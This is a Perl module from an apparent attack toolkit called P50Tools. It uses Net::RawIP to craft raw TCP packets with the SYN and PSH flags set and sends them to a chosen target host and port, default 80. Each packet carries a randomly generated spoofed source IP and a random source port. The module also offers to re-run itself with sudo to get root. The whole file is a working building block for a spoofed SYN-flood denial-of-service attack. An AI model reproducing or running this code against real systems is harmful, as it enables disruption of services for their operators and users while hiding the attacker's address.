package P50Tools::Packs;

{
    no strict "vars";
    $VERSION = '0.3';
}

if ($^O eq m/MSW/gi) {
	print "you cannot use this\n";
	print "you can modified this package but you will need Net::RawIP, but this package require libcarp, and it's is incompatible with Windows\n"; 
	exit 0;
}

unless ($< == 0) {
	print "It is recommended to run this Tool as Root User\n\nDo you Would you like to change your Permissions to ROOT?\n";
	print "[yes/no]";
	chomp (my $choice = <>);
	my $work = 1;
	while ($work == 1){
		if ($choice eq 'yes'){
			system ('sudo perl ' . $0);
			system ('clear');
			exit;
			$work = 0;
		}
		elsif ($choice eq 'no'){
			print "This package can be a bed performing\n";
			system ('clear');
			$work = 0;
		}
		else{
			print "ERROR!\nType only 'yes' or 'no'\n";
			$choice = <>;
			chomp $choice;
		}
	}
}

use common::sense;
use Net::RawIP;
use Packs::PacksSize;
use Packs::RandonIp;
use Moose;

has 'target' => (is => 'rw', isa => 'Str');
has 'door' => (is => 'rw', isa => 'Str', default => 80);

sub send{
	my $self = shift;
	my $s1 = $self->target;
	my $s2 = $self->door;
	
	my $ip = P50Tools::Packs::RandonIp->new(); 
	my $size = P50Tools::Packs::PacksSize->new();
	say "___________________________";
    say "DADDR = $s1";
    say "SADDR = $ip";
    say "SOURCE = $size";
    say "DEST = $s2";
	say "___________________________";
	my $n = Net::RawIP->new({
		ip => {
			saddr => $ip,
			daddr => $s1,
		},
		tcp => {
			source => $size,
			dest => $s2,
			psh => 1,
			syn => 1,
		},
	});
	$n->send;
	return $n;
}
no Moose;
1;

__END__
=head1 
For more information go to L<P50Tools>.
=cut
